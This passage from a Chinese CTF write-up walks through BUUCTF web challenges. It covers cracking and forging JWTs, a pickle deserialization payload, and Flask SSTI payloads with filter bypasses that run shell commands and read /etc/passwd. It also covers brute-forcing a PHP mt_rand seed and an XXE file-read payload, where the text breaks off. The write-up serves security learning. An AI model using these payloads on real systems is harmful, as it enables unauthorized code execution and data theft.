<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span>   <span class="comment">//signature部分的加密算法,可以为None,</span></span><br><span class="line"> <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span>      <span class="comment">//声明类型为JWT</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>payload</code>格式为:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;user_role&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;finn&quot;</span><span class="punctuation">,</span>    	<span class="comment">//当前登录用户</span></span><br><span class="line">   <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span>          	<span class="comment">//该JWT的签发者,有些是URL</span></span><br><span class="line">   <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//签发时间</span></span><br><span class="line">   <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1573940267</span><span class="punctuation">,</span>        <span class="comment">//过期时间</span></span><br><span class="line">   <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1573440582</span><span class="punctuation">,</span>        <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">   <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.com&quot;</span><span class="punctuation">,</span>   <span class="comment">//面向的用户</span></span><br><span class="line">   <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class="comment">//Token唯一标识</span></span><br><span class="line">&gt;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>signature</code>通过指定的加密算法, <strong>以及一个用户指定的<code>secret_key</code>,</strong> 对<code>header</code>、<code>payload</code>两部分进行计算得到. 签名可以为空,如果这样设置, 任何token都可以通过服务器的认证</p>
<p><code>header</code>、<code>payload</code>使用<code>base64url</code>编码, 所以和明文没什么区别</p>
</blockquote>
<p>使用<code>c-jwt-cracker</code>工具可以对用于计算<code>signature</code>进行爆破 (只能爆破弱密钥)</p>
<p>使用<code>jwt_tool</code>可以对<code>JWT token</code>进行解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/c-jwt-cracker/c-jwt-cracker]</span><br><span class="line">└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIyMiJ9.3H1j76lr69MYIZ48VY1Jdrjpw-GZdPSSbEwpE0gCR8o   </span><br><span class="line">Secret is &quot;1Kun&quot;</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.03HaDCk7C7vfJw9Wa-yDflSMoeV_1jpCaTILcgJXpZY</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221025193722302.png" alt="image-20221025193722302"></p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>这里拿到爆破所得的<code>secret_key</code>, 并在解密后将<code>payload</code>中的<code>username</code>字段的值改为<code>admin</code></p>
<p>从而计算得到一个新的<code>JWT token</code></p>
<img src="/images/buuctf-web2/image-20221025194112546.png" alt="image-20221025194112546" style="zoom:67%;" />

<p>用新<code>token</code>来访问<code>/b1g_m4mber </code>,成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>



<img src="/images/buuctf-web2/image-20221025194237910.png" alt="image-20221025194237910" style="zoom:80%;" />

<p>去下载<code>&quot;/static/asd1f654e683wq/www.zip&quot;</code></p>
<p>翻一下代码, 在<code>admin.py</code>中找到了可利用的<code>pickle</code>反序列化漏洞:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里对传进来的参数<code>become</code>用<code>unquote</code>解码之后, 使用<code>pickle.loads</code>来进行反序列化</p>
<p>这么这里就需要在<code>become</code>中构建序列化的字符串: (这里需要使用python2)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">输出:</span></span><br><span class="line"><span class="string">c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">(S&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line"><span class="string">p1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">Rp3</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后将最后这个编码后的字符串传给<code>become</code>参数</p>
<p>这里使用burpsuite传参时会一直403, 那么直接使用浏览器: 先使用hackbar添加cookie中的<code>JWT</code>从而访问到<code>/b1g_m4mber</code></p>
<p>对比bp和浏览器: 浏览器中好像少了个输入框</p>
<p><img src="/images/buuctf-web2/image-20221025225155819.png" alt="image-20221025225155819"></p>
<p>在<code>元素</code>中搜索<code>become</code>看看这个参数是在哪传的:</p>
<p><img src="/images/buuctf-web2/image-20221025225310131.png" alt="image-20221025225310131"></p>
<p>可以看到输入<code>become</code>的位置加了隐藏<code>hidden</code>属性</p>
<p>这里将这个属性删除, 发现出现了输入框,将前面得出的payload输入:然后点击按钮, flag就被读取出来了</p>
<img src="/images/buuctf-web2/image-20221025225510518.png" alt="image-20221025225510518" style="zoom:67%;" />

<br>

<hr>
<br>



<h1 id="FlaskSSTI-bypass-FlaskLight"><a href="#FlaskSSTI-bypass-FlaskLight" class="headerlink" title="[FlaskSSTI,bypass]FlaskLight"></a>[FlaskSSTI,bypass]FlaskLight</h1><img src="/images/buuctf-web2/image-20221026094350556.png" alt="image-20221026094350556" style="zoom:67%;" />

<p>存在<code>SSTI</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;config&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;Config &#123;&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: False, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;SECRET_KEY&#x27;: &#x27;CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;&#x27;, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False&#125;&gt;</span><br><span class="line"></span><br><span class="line">SECRET_KEY: CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;</span><br><span class="line">这个没什么用</span><br></pre></td></tr></table></figure>

<p>读文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">疑似用户:www-data</span><br></pre></td></tr></table></figure>

<p>下面尝试命令执行的时候发现过滤了很多关键词</p>
<p>查找基类和子类都没有问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0]&#125;&#125;</span><br><span class="line">输出:&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br><span class="line">输出子类列表</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59]&#125;&#125;</span><br><span class="line">输出&lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>具体执行命令时会爆500</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">500</span><br></pre></td></tr></table></figure>

<p>两种绕过方法:</p>
<p>1.通过<code>request.args.x</code>使用其他参数来传关键词</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)&#125;&#125;&amp;a=__init__&amp;b=__globals__&amp;c=__builtins__&amp;d=eval&amp;e=__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()</span><br><span class="line"></span><br><span class="line">bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">/flasklight : app.py coomme_geeeett_youur_flek</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59][request.args.a][request.args.b][request.args.c][request.args.d](request.args.e)&#125;&#125;&amp;a=__init__&amp;b=__globals__&amp;c=__builtins__&amp;d=eval&amp;e=__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()</span><br><span class="line">flag&#123;add0f032-3cdb-40b9-aa25-cd53d5c146fd&#125;</span><br></pre></td></tr></table></figure>

<p>2.字符串拼接:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&quot;__glo&quot;+&quot;bals__&quot;][&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="伪随机数-枯燥的抽奖"><a href="#伪随机数-枯燥的抽奖" class="headerlink" title="[伪随机数]枯燥的抽奖"></a>[伪随机数]枯燥的抽奖</h1><p>这种一般都不能硬猜吧</p>
<img src="/images/buuctf-web2/image-20221026100046964.png" alt="image-20221026100046964" style="zoom:80%;" />

<p>源码发现了<code>check&#39;.php</code></p>
<p><img src="/images/buuctf-web2/image-20221026100104694.png" alt="image-20221026100104694"></p>
<p>访问拿到代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">chcRo2MtG9</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125; <span class="comment">//对于同一个种子来说, 这20轮循环中每次随机到的数都是相同的</span></span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>伪随机数是用确定性的算法计算出来的随机数序列，它并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>若使用的初值（种子）不变，那么伪随机数的数序也不变</span>:。伪随机数可以用计算机大量生成，在模拟研究中为了提高模拟效率，一般采用伪随机数代替真正的随机数。模拟中使用的一般是循环周期极长并能通过随机数检验的伪随机数，以保证计算结果的随机性。伪随机数的生成方法有线性同余法、单向散列函数法、密码法等。</p>
<p><strong><code>mt_rand</code>就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</strong></p>
</blockquote>
<p>这里可以用<code>php_mt_seed</code>来爆破种子, 有两种类型的数据可以提交, 一是某个种子的第一个<code>mt_rand</code>生成出来的完整数, 或者提交已知的多个随机数序列,使用方法为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_mt_seed xxx  这里xxx是用 mt_srand 播种后生成的第一个伪随机数</span><br><span class="line">php_mt_seed a1 b1 c1 d1 a2 b2 c2 d2 a3 b3 c3 d3  其中a1,b1为在某个范围内生成的随机数, c1,d1是生成随机数时mt_rand指定的生成范围</span><br><span class="line">例如第一次调用mt_rand(0,61) = 2 第二次调用mt_rand(0,61) = 30</span><br><span class="line">那么这里就是php_mt_seed 2 2 0 61 30 30 0 61</span><br></pre></td></tr></table></figure>

<p>那么使用脚本将目前已知的串转化为上面的形式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">b = <span class="string">&quot;chcRo2MtG9&quot;</span></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> b:</span><br><span class="line">    string += <span class="built_in">str</span>(a.index(c)) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(a.index(c)) + <span class="string">&#x27; 0 61 &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line"><span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">61</span> <span class="number">7</span> <span class="number">7</span> <span class="number">0</span> <span class="number">61</span> <span class="number">2</span> <span class="number">2</span> <span class="number">0</span> <span class="number">61</span> <span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">14</span> <span class="number">14</span> <span class="number">0</span> <span class="number">61</span> <span class="number">28</span> <span class="number">28</span> <span class="number">0</span> <span class="number">61</span> <span class="number">48</span> <span class="number">48</span> <span class="number">0</span> <span class="number">61</span> <span class="number">19</span> <span class="number">19</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> </span><br></pre></td></tr></table></figure>

<p>利用<code>php_mt_seed</code>来爆破种子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/php_mt_seed-4.0]</span><br><span class="line">└─$ ./php_mt_seed 2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61        </span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 1526.3 Mseeds/s </span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x0e000000 - 0x0fffffff, speed 61.6 Mseeds/s </span><br><span class="line">seed = 0x0f8bea05 = 260827653 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 57.9 Mseeds/s </span><br><span class="line">Found 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>那么利用给好的源码自己把完整的串生成出来:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">260827653</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">chcRo2MtG9M6I3roNmwa</span><br></pre></td></tr></table></figure>



<img src="/images/buuctf-web2/image-20221026114918358.png" alt="image-20221026114918358" style="zoom:67%;" />



<br>

<hr>
<br>



<h1 id="XXE-爆破内网网段-True-XML-cookbook"><a href="#XXE-爆破内网网段-True-XML-cookbook" class="headerlink" title="[XXE,爆破内网网段]True XML cookbook"></a>[XXE,爆破内网网段]True XML cookbook</h1><p><img src="/images/buuctf-web2/image-20221026123210924.png" alt="image-20221026123210924"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;124&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>输出一下<code>doLogin</code>的源码:</p>
